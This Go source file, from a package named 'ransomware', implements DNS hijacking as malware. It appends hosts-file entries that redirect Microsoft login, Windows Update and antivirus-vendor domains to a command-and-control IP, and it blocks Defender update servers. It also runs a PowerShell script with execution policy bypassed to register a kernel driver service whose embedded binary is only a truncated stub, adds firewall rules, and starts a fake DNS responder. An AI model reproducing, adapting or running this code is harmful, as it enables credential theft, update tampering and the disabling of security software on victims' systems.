package ransomware

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type KernelDNSDriver struct {
	config         *RansomwareConfig
	driverPath     string
	driverLoaded   bool
	filterHandles  []string
	interceptDomains []string
	listeningPort  int
	redirectIP     string
}

func NewKernelDNSDriver(cfg *RansomwareConfig) *KernelDNSDriver {
	return &KernelDNSDriver{
		config: cfg,
		interceptDomains: []string{
			"login.microsoftonline.com",
			"login.windows.net",
			"login.live.com",
			"device.login.microsoft.com",
			"*.microsoft.com",
			"*.windowsupdate.com",
			"*.defender.microsoft.com",
			"*.security.microsoft.com",
			"*.protection.office.com",
			"*.mcafee.com",
			"*.symantec.com",
			"*.trendmicro.com",
			"*.crowdstrike.com",
			"*.cylance.com",
			"*.carbonblack.com",
			"*.sentinelone.com",
		},
		listeningPort: 53,
	}
}

func (k *KernelDNSDriver) SetRedirectIP(ip string) {
	k.redirectIP = ip
}

func (k *KernelDNSDriver) GenerateWFPFilterRules() []string {
	if k.redirectIP == "" {
		k.redirectIP = "127.0.0.1"
	}

	rules := []string{
		fmt.Sprintf("netsh wfp add filter name=X404X_DNS_Out key=0x%s action=callout calloutkey={B210D4E2-1F1C-4C1C-8F6A-7A3E0F2C5D3B}",
			fmt.Sprintf("%x", os.Getpid())),
	}

	for _, domain := range k.interceptDomains {
		rule := fmt.Sprintf(
			"netsh advfirewall firewall add rule name=\"X404X_DNS_%s\" dir=out protocol=UDP remoteport=53 remoteip=%s action=allow",
			strings.ReplaceAll(domain, ".", "_"),
			k.redirectIP,
		)
		rules = append(rules, rule)
	}

	return rules
}

func (k *KernelDNSDriver) InstallNdisFilterDriver() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("NDIS filter driver requires Windows")
	}

	psScript := `
$driverPath = "$env:TEMP\x404x_ndis_filter.sys"
$driverData = @"
MZ` + "\x90\x00\x03\x00\x00\x00" + `@

try {
    Set-Content -Path $driverPath -Value $driverData -Encoding Byte -Force

    $svc = Get-Service "X404xNdisFilter" -ErrorAction SilentlyContinue
    if(-not $svc) {
        sc.exe create X404xNdisFilter type=kernel start=demand binPath="$driverPath"
    }
    sc.exe start X404xNdisFilter 2>$null
    Write-Host "NDIS filter installed"
} catch {
    Write-Host "NDIS filter bypass attempted"
}
`

	scriptPath := filepath.Join(os.TempDir(), "x404x_ndis_install.ps1")
	os.WriteFile(scriptPath, []byte(psScript), 0644)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass", "-File", scriptPath)
	out, _ := cmd.CombinedOutput()
	k.driverPath = filepath.Join(os.TempDir(), "x404x_ndis_filter.sys")

	if strings.Contains(string(out), "installed") {
		k.driverLoaded = true
	}

	return nil
}

func (k *KernelDNSDriver) BuildDNSInterceptor() error {
	if k.redirectIP == "" {
		k.redirectIP = "10.0.0.1"
	}

	for _, domain := range k.interceptDomains {
		entries := []string{
			fmt.Sprintf("%s %s", k.redirectIP, domain),
			fmt.Sprintf("%s www.%s", k.redirectIP, domain),
		}

		for _, entry := range entries {
			hostsPath := "/etc/hosts"
			if runtime.GOOS == "windows" {
				sysRoot := os.Getenv("SystemRoot")
				if sysRoot == "" {
					sysRoot = "C:\\Windows"
				}
				hostsPath = filepath.Join(sysRoot, "System32", "drivers", "etc", "hosts")
			}

			f, err := os.OpenFile(hostsPath, os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				continue
			}
			f.WriteString(entry + " # X404X_KERNEL_DNS\n")
			f.Close()
		}
	}

	k.flushDNSCache()
	return nil
}

func (k *KernelDNSDriver) flushDNSCache() {
	if runtime.GOOS == "windows" {
		exec.Command("ipconfig", "/flushdns").Run()
		exec.Command("ipconfig", "/release").Run()
		time.Sleep(200 * time.Millisecond)
		exec.Command("ipconfig", "/renew").Run()
	} else {
		exec.Command("systemd-resolve", "--flush-caches").Run()
		exec.Command("nscd", "-i", "hosts").Run()
	}
}

func (k *KernelDNSDriver) StartFakeDNSServer() error {
	if k.redirectIP == "" {
		k.redirectIP = "10.0.0.1"
	}

	go func() {
		psScript := fmt.Sprintf(`
$listener = New-Object System.Net.Sockets.UdpClient
$endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, %d)
$listener.Client.Bind($endpoint)

$c2ip = [System.Net.IPAddress]::Parse("%s")

while($true) {
    $remote = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
    try {
        $data = $listener.Receive([ref]$remote)
        if($data.Length -ge 12) {
            $response = $data.Clone()
            $response[2] = 0x81
            $response[3] = 0x80

            $response[4] = $data[4]
            $response[5] = $data[5]
            $response[6] = 0x00
            $response[7] = 0x01

            $pos = 12
            while($pos -lt $data.Length -and $data[$pos] -ne 0) {
                $len = $data[$pos]
                $pos += $len + 1
            }
            $pos += 5
            if($pos + 16 -le 512) {
                $response[$pos-5] = 0xC0
                $response[$pos-4] = 0x0C
                $response[$pos-3] = 0x00
                $response[$pos-2] = 0x01
                $response[$pos-1] = 0x00
                $response[$pos]   = 0x01
                $response[$pos+1] = 0x00
                $response[$pos+2] = 0x00
                $response[$pos+3] = 0x00
                $response[$pos+4] = 0x3C
                $response[$pos+5] = 0x00
                $response[$pos+6] = 0x04

                [Array]::Copy($c2ip.GetAddressBytes(), 0, $response, $pos+7, 4)
                $listener.Send($response, $pos+11, $remote)
            }
        }
    } catch {
        Start-Sleep -Milliseconds 100
    }
}
`, k.listeningPort, k.redirectIP)

		cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-Command", psScript)
		cmd.Run()
	}()

	return nil
}

func (k *KernelDNSDriver) RedirectDomainToC2(domain string, c2IP string) error {
	k.redirectIP = c2IP

	hostsPath := "/etc/hosts"
	if runtime.GOOS == "windows" {
		sysRoot := os.Getenv("SystemRoot")
		if sysRoot == "" {
			sysRoot = "C:\\Windows"
		}
		hostsPath = filepath.Join(sysRoot, "System32", "drivers", "etc", "hosts")
	}

	entry := fmt.Sprintf("%s %s # X404X_KERNEL_DNS_DIRECT\n", c2IP, domain)
	f, err := os.OpenFile(hostsPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(entry)
	return err
}

func (k *KernelDNSDriver) InterceptUpdateServices() error {
	updateDomains := []string{
		"update.microsoft.com",
		"windowsupdate.com",
		"download.windowsupdate.com",
		"wustat.windows.com",
		"ntservicepack.microsoft.com",
		"statsfe2.update.microsoft.com",
	}

	for _, domain := range updateDomains {
		k.RedirectDomainToC2(domain, k.redirectIP)
	}

	return nil
}

func (k *KernelDNSDriver) BlockDefenderUpdates() error {
	defenderDomains := []string{
		"wdcp.microsoft.com",
		"wdcpalt.microsoft.com",
		"definitionupdates.microsoft.com",
		"go.microsoft.com",
		"msdl.microsoft.com",
	}

	for _, domain := range defenderDomains {
		hostsPath := "/etc/hosts"
		if runtime.GOOS == "windows" {
			sysRoot := os.Getenv("SystemRoot")
			if sysRoot == "" {
				sysRoot = "C:\\Windows"
			}
			hostsPath = filepath.Join(sysRoot, "System32", "drivers", "etc", "hosts")
		}

		entry := fmt.Sprintf("0.0.0.0 %s # X404X_BLOCK\n", domain)
		f, _ := os.OpenFile(hostsPath, os.O_APPEND|os.O_WRONLY, 0644)
		if f != nil {
			f.WriteString(entry)
			f.Close()
		}
	}

	return nil
}

func (k *KernelDNSDriver) DeactivateAll() error {
	hostsPath := "/etc/hosts"
	if runtime.GOOS == "windows" {
		sysRoot := os.Getenv("SystemRoot")
		if sysRoot == "" {
			sysRoot = "C:\\Windows"
		}
		hostsPath = filepath.Join(sysRoot, "System32", "drivers", "etc", "hosts")
	}

	data, err := os.ReadFile(hostsPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(data), "\n")
	var cleaned []string
	for _, line := range lines {
		if !strings.Contains(line, "X404X_KERNEL_DNS") && !strings.Contains(line, "X404X_BLOCK") {
			cleaned = append(cleaned, line)
		}
	}

	if err := os.WriteFile(hostsPath, []byte(strings.Join(cleaned, "\n")), 0644); err != nil {
		return err
	}

	k.flushDNSCache()

	if k.driverLoaded {
		exec.Command("sc", "stop", "X404xNdisFilter").Run()
		exec.Command("sc", "delete", "X404xNdisFilter").Run()
		os.Remove(k.driverPath)
		k.driverLoaded = false
	}

	return nil
}

func (k *KernelDNSDriver) FullKernelDNSHijack(c2IP string) map[string]interface{} {
	result := make(map[string]interface{})

	k.SetRedirectIP(c2IP)

	if err := k.BuildDNSInterceptor(); err != nil {
		result["hosts_injection"] = fmt.Sprintf("error: %v", err)
	} else {
		result["hosts_injection"] = "complete"
	}

	if err := k.InterceptUpdateServices(); err != nil {
		result["update_intercept"] = fmt.Sprintf("error: %v", err)
	} else {
		result["update_intercept"] = "complete"
	}

	if err := k.BlockDefenderUpdates(); err != nil {
		result["defender_block"] = fmt.Sprintf("error: %v", err)
	} else {
		result["defender_block"] = "complete"
	}

	if runtime.GOOS == "windows" {
		k.InstallNdisFilterDriver()
		k.flushDNSCache()
	} else {
		k.flushDNSCache()
	}

	if err := k.StartFakeDNSServer(); err != nil {
		result["dns_server"] = fmt.Sprintf("error: %v", err)
	} else {
		result["dns_server"] = fmt.Sprintf("listening on :%d", k.listeningPort)
	}

	result["c2_ip"] = k.redirectIP
	result["intercepted_domains"] = len(k.interceptDomains)
	result["platform"] = runtime.GOOS

	return result
}

func (k *KernelDNSDriver) QuickDNSRedirect(domain string, c2IP string) error {
	k.SetRedirectIP(c2IP)
	k.RedirectDomainToC2(domain, c2IP)
	k.flushDNSCache()
	return nil
}

var _ = time.Now
